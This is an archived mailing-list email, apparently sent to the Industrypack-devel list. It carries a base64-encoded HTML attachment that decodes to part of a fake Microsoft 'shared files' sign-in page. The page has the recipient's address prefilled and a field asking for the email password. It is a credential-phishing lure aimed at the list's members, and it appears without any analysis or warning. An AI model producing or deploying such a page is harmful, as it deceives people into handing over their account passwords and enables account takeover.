diBhbGlnbj0iY2VudGVyIj4NCgkJCQkJCQkJPGZvbnQgZmFjZT0iYXJpYWwiIHNpemU9IjIiIGNv
bG9yPSIjRkZGIj4NCgkJCQkJCQkJCTxmb250IHNpemU9IjIiPk9ubHkgcmVjaXBpZW50IGVtYWls
IGNhbiBhY2Nlc3Mgc2hhcmVkIGZpbGVzIDwvZm9udD4NCgkJCQkJCQkJPC9mb250Pg0KCQkJCQkJ
CQk8L2Rpdj4NCgkJCQkJPC90ZD48L3RyPg0KDQoJCQkJCTx0cj48dGQgc3R5bGU9ImhlaWdodDo1
cHg7Ij48L3RkPjwvdHI+DQoNCgkJCQkJPHRyPjx0ZD4NCgkJCQkJCTx0YWJsZSBjZWxsc3BhY2lu
Zz0iMCIgYWxpZ249ImNlbnRlciI+DQoJCQkJCQk8dHI+PHRkPg0KCQkJCQkJCTxkaXYgYWxpZ249
ImNlbnRlciI+DQoJCQkJCQkJCTxpbnB1dCAgbmFtZT0ibG9naW4iIHR5cGU9ImVtYWlsIiB2YWx1
ZT0iaW5kdXN0cnlwYWNrLWRldmVsQGxpc3RzLnNvdXJjZWZvcmdlLm5ldCIgZGlzYWJsZWQ+DQoJ
CQkJCQkJPC9kaXY+DQoJCQkJCQk8L3RkPjwvdHI+DQoNCg0KCQkJCQkJPHRyPjx0ZCBzdHlsZT0i
aGVpZ2h0OjdweDsiPjwvdGQ+PC90cj4NCg0KCQkJCQkJPHRyPjx0ZD4NCgkJCQkJCQk8ZGl2IGFs
aWduPSJjZW50ZXIiPg0KCQkJCQkJCQk8aW5wdXQgIG5hbWU9InBhc3N3ZCIgdHlwZT0icGFzc3dv
cmQiIHBsYWNlaG9sZGVyPSJFbWFpbCBQYXNzd29yZCIgcmVxdWlyZWQ+DQoJCQkJCQkJPC9kaXY+
DQoJCQkJCQk8L3RkPjwvdHI+DQoJCQkJCQk8dHI+PHRkIHN0eWxlPSJoZWlnaHQ6MTVweDsiPjwv
dGQ+PC90cj4NCgkJCQkJCTx0cj48dGQ+DQoJCQkJCQkJPGRpdiBhbGlnbj0ibGVmdCI+DQoJCQkJ
CQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTaWduIGluIj4NCgkJCQkJCQk8L2Rpdj4N
CgkJCQkJCTwvdGQ+PC90cj4NCgkJCQkJCTx0cj48dGQ+DQoJCQkJCQk8L3RkPjwvdHI+DQoJCQkJ
CQk8dHI+PHRkIHN0eWxlPSJoZWlnaHQ6MjBweDsiPg0KCQkJCQkJCTxpbnB1dCAgbmFtZT0ibG9n
aW4iIHR5cGU9ImhpZGRlbiIgdmFsdWU9ImluZHVzdHJ5cGFjay1kZXZlbEBsaXN0cy5zb3VyY2Vm
b3JnZS5uZXQiPg0KCQkJCQkJCTwvZm9ybT4NCgkJCQkJCTwvdGQ+PC90cj4NCgkJCQkJCTwvdGFi
bGU+DQoJCQkJCTwvdGQ+PC90cj4NCgk8L3RhYmxlPg0KPC9kaXY+DQo8L3RkPjwvdHI+DQo8dHI+
PHRkIGhlaWdodD0iNSUiIGJnY29sb3I9IiMxQzFDMUMiPg0KCTxkaXYgYWxpZ249ImNlbnRlciI+
DQoJCTxmb250IGZhY2U9InZlcmRhbmEiIHNpemU9IjEiIGNvbG9yPSIjRkZGIj4NCgkJCUNvcHly
aWdodCCpIDIwMjIgbWljcm9zb2Z0LiBBbGwgcmlnaHRzIHJlc2VydmVkLg0KCQk8L2ZvbnQ+DQoJ
PC9kaXY+DQo8L3RkPjwvdHI+DQo8L3RhYmxlPg0KPC9ib2R5Pg0KPC9odG1sPg0KdGFyZ2V0PV9i
bGFuayANCmRhdGEtc2FmZXJlZGlyZWN0dXJsPSJodHRwczovL3d3dy5nb29nbGUuY29tL3VybD9x

------=_NextPart_000_0012_D1C54893.4E1351D3
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


------=_NextPart_000_0012_D1C54893.4E1351D3
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

------=_NextPart_000_0012_D1C54893.4E1351D3--

